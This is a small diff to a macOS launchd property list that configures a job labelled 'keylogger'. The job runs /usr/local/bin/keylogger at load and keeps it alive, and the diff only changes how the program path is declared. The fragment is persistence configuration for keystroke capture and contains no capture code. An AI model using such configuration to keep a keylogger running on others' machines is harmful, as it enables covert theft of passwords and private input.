@@ -4,10 +4,8 @@
 <dict>
   <key>Label</key>
   <string>keylogger</string>
-  <key>ProgramArguments</key>
-  <array>
-      <string>/usr/local/bin/keylogger</string>
-  </array>
+  <key>Program</key>
+  <string>/usr/local/bin/keylogger</string>
   <key>RunAtLoad</key>
   <true/>
   <key>KeepAlive</key>
